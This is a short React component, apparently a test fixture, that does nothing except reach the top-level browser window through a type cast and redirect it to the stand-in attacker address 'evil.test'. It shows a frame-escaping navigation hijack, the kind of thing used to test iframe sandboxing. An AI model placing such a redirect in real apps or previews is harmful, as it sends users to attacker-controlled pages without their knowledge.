export default function App() {
  const w = window
  const t = (w as unknown as { top: Window }).top
  t.location.assign('https://evil.test')
  return null
}
